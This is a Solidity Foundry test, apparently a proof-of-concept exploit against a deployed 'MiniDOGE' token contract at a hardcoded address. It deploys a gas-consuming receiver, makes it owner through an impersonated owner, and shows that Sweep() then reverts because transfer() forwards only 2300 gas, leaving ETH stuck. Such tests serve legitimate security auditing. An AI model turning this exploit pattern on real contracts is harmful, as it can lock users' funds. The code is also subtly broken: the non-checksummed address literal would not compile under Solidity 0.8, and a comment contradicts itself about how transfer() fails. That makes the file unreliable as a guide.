```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.4;

import "forge-std/Test.sol";

interface IMiniDOGE {
    function owner() external view returns (address);
    function transferOwnership(address newOwner) external;
    function Sweep() external;
    function balanceOf(address account) external view returns (uint256);
}

// A contract that will consume more than 2300 gas on receiving ETH
contract GasConsumer {
    uint256 public data;
    receive() external payable {
        // Write to storage – costs at least 5000 gas, exceeding the 2300 gas stipend
        data = 1;
    }
    fallback() external payable {
        // Also prevent any other calls from succeeding
        revert("GasConsumer: no fallback");
    }
}

contract ExploitTest is Test {
    address constant MINIDOGE = 0xba07eed3d09055d60caef2bdfca1c05792f2dfad;
    IMiniDOGE miniDoge;

    function setUp() public {
        vm.label(MINIDOGE, "MiniDOGE");
        miniDoge = IMiniDOGE(MINIDOGE);
    }

    function testTransferDoS() public {
        // 1. Get current owner (almost certainly an EOA)
        address owner = miniDoge.owner();

        // 2. Deploy a malicious recipient that needs more than 2300 gas
        GasConsumer gasGuzzler = new GasConsumer();
        vm.label(address(gasGuzzler), "GasGuzzler");

        // 3. Transfer ownership to the gas-guzzling contract
        vm.startPrank(owner);
        miniDoge.transferOwnership(address(gasGuzzler));
        vm.stopPrank();

        // 4. Fund the MiniDOGE contract with some ETH
        deal(MINIDOGE, 1 ether);

        // 5. As the new owner (gasGuzzler), try to sweep the ETH
        //    This will call payable(owner()).transfer(balance) which only
        //    forwards 2300 gas – insufficient for the storage write in GasConsumer.receive().
        vm.prank(address(gasGuzzler));
        vm.expectRevert(); // .transfer() silently fails and the whole call reverts
        miniDoge.Sweep();

        // 6. Assert that the ETH remains in the contract (i.e., the transfer did not succeed)
        assertEq(MINIDOGE.balance, 1 ether, "ETH should not have been transferred");
    }
}
```
